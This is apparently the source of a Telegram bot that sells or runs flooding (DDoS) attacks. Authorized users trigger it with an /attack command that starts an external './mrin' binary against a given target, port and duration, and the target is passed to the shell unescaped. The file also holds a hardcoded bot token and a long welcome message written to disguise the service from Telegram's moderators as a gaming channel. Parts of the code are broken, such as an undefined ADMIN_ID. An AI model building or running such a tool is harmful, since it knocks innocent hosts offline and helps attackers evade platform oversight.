import time
import subprocess
import os
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# === CONFIGURATION ===

BOT_TOKEN = '7781462274:AAGxABKvSqKcSp9Y9PdJo-A_wcTW0XGoz3I'  # Replace with your bot token
admin_ids = ["7383077317", "6240348610", "6188354219", "1066744659", "8159441634"]      # Replace with your Telegram user ID
USER_FILE = "authorized_users.txt"  # File to store user IDs
admin_ids = {ADMIN_ID}              # Admin user IDs set

# === UPTIME TRACKING ===

start_time = time.time()

def get_uptime():
    uptime_seconds = int(time.time() - start_time)
    hours = uptime_seconds // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60
    return f"{hours}h {minutes}m {seconds}s"

# === LOAD/SAVE USERS ===

def load_users():
    if not os.path.exists(USER_FILE):
        return set()
    with open(USER_FILE, 'r') as f:
        return set(int(line.strip()) for line in f if line.strip().isdigit())

def save_users(users):
    with open(USER_FILE, 'w') as f:
        for user_id in users:
            f.write(f"{user_id}\n")

authorized_users = load_users()

# === SYSTEM INFO ===

def get_lscpu_info():
    try:
        result = subprocess.run(['lscpu'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip() if result.returncode == 0 else "Could not retrieve CPU info."
    except Exception as e:
        return f"Error running lscpu: {e}"

# === UTILITIES ===

def log_user_activity(log_line, user_id):
    with open("user_activity.log", "a") as f:
        f.write(log_line + "\n")

def is_host_alive(target, port):
    return "Alive"  # Placeholder for real ping/check logic

def get_device_info():
    return "DeviceInfo"  # Placeholder

def get_ip_info(ip):
    return f"Location of {ip}"  # Placeholder

# === COMMAND HANDLERS ===

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in authorized_users:
        await update.message.reply_text(
    "Welcome to our gaming community! 🎮\n\n"
    "I hope this message finds you well. I am writing to clarify the content and focus of my channel or bot to ensure it aligns with Telegram’s community guidelines and policies.\n\n"
    "The channel is dedicated exclusively to gaming discussions, with a particular emphasis on Battlegrounds Mobile (PUBG), BGMI (Battlegrounds Mobile India), and a variety of other popular games. I want to stress that any references to terms such as 'guns,' 'gunlabs,' or similar phrases are strictly related to in-game items, mechanics, and strategies within these games. These references are intended solely to enhance the gaming experience for players and bear no connection to real-world firearms, illegal activities, or prohibited goods.\n\n"
    "Understanding the importance of maintaining a safe and respectful online community is vital, and I take this responsibility seriously. Strict moderation practices have been implemented to ensure that all content shared adheres to Telegram’s guidelines. The goal is to foster an inclusive environment where gamers can freely discuss their experiences, share tips, and engage in lively discussions about PUBG, BGMI, and other games, including popular titles such as Call of Duty, Fortnite, Apex Legends, and more.\n\n"
    "It is essential to note that if any inappropriate content were to appear due to unauthorized access or actions taken by third-party hackers, it would not be the fault of the channel, bot, or its owners and admins. Any such incidents could stem from hacking attempts on devices, whether mobile or desktop, or vulnerabilities in third-party bots. I am committed to taking all necessary measures to prevent such situations and ensure the integrity of the channel. Additionally, I will promptly address any concerns that arise from unauthorized actions.\n\n"
    "Furthermore, I am fully aware of the potential implications of discussing sensitive topics, and I want to assure you that the channel does not promote or engage in any illegal transactions or activities of any kind. The focus remains entirely on virtual interactions and in-game experiences, ensuring that all discussions are relevant and appropriate for the gaming community.\n\n"
    "I appreciate the platform that Telegram provides for communication and community building, and I am committed to upholding the standards expected of all users. Should there be any concerns or requests for further clarification regarding the channel’s content, please do not hesitate to reach out. Your support and guidance in maintaining a positive environment for all members are highly valued.\n\n"
    "Thank you for your time and understanding!\n\n"
    "All set? Use /status to check bot health."
        )
    else:
        await update.message.reply_text("Access Denied.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in authorized_users:
        uptime = get_uptime()
        cpu_info = get_lscpu_info()
        message = f"Bot Uptime: {uptime}\n\nCPU Info:\n\n{cpu_info}\n"
        await update.message.reply_text(message, parse_mode="Markdown")
    else:
        await update.message.reply_text("Access Denied.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authorized_users:
        await update.message.reply_text("Access Denied.")
        return

    help_text = (
        "Available Commands:\n"
        "/start - Welcome message\n"
        "/status - Show bot uptime and CPU info\n"
        "/help - Show this help message\n"
        "/add <user_id> - Add a user (admin only)\n"
        "/remove <user_id> - Remove a user (admin only)\n"
        "/list - Show all authorized users (admin only)\n"
        "/attack <target> <port> <time> - Launch an attack (admin/authorized users only)"
    )
    await update.message.reply_text(help_text)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("Access Denied.")
        return

    if not authorized_users:
        await update.message.reply_text("No authorized users yet.")
    else:
        user_list = "\n".join(str(uid) for uid in authorized_users)
        await update.message.reply_text(f"Authorized Users:\n{user_list}")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Only the admin can add users.")
        return
    try:
        user_id = int(context.args[0])
        authorized_users.add(user_id)
        save_users(authorized_users)
        await update.message.reply_text(f"User {user_id} added.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /add <user_id>")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Only the admin can remove users.")
        return
    try:
        user_id = int(context.args[0])
        if user_id in authorized_users:
            authorized_users.remove(user_id)
            save_users(authorized_users)
            await update.message.reply_text(f"User {user_id} removed.")
        else:
            await update.message.reply_text(f"User {user_id} is not in the list.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /remove <user_id>")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    full_name = f"{update.effective_user.first_name} {update.effective_user.last_name or ''}".strip()
    username = update.effective_user.username or "NoUsername"

    if int(user_id) in admin_ids or int(user_id) in authorized_users:
        command = update.message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                duration = int(command[3])

                if duration > 1000:
                    response = "Error: Time interval must be less than 1000 seconds."
                else:
                    response = f"Flooding: {target}:{port} for {duration}s. Attack running."
                    full_command = f"./mrin {target} {port} {duration} 1800"
                    subprocess.Popen(full_command, shell=True)

                    if int(user_id) not in admin_ids:
                        ip = target
                        status = is_host_alive(ip, port)
                        location = get_ip_info(ip)
                        device = get_device_info()
                        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                        log_line = (
                            f"{timestamp} Name: {full_name} | Username: @{username} | "
                            f"UserID: {user_id} | IP: {ip} | Port: {port} | Time: {duration}s | "
                            f"Status: {status} | Device: {device} | Location: {location}"
                        )
                        log_user_activity(log_line, user_id)
            except ValueError:
                response = "Error: Port and duration must be valid integers."
        else:
            response = "Usage: /attack <target> <port> <time>."
    else:
        response = "Access Denied. Contact admin."

    await update.message.reply_text(response)

# === MAIN FUNCTION ===

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("list", list_users))
    app.add_handler(CommandHandler("attack", attack))

    print(f"Bot started. Authorized user file: {USER_FILE}")
    app.run_polling()
